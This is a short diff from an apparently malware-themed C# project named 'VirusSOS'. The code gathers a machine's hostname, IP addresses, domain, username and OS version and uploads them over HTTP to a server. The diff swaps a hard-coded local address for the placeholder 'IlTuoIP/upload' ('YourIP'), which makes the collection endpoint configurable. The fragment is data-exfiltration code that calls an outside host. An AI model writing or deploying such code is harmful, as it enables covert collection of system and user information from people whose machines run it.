@@ -36,7 +36,7 @@ namespace VirusSOS;
 
                 string content = $"Hostname: {hostname}\nIP Address: {ipList}\nNome Macchina: {nomeMacchina}\nDominio: {dominio}\nNome Utente: {nomeUtente}\nVersione OS: {windows}\n";
 
-                string server = "http://192.168.1.28:5000/upload";
+                string server = "IlTuoIP/upload";
                 using (var client = new HttpClient())
                 using (var form = new MultipartFormDataContent())
                 {
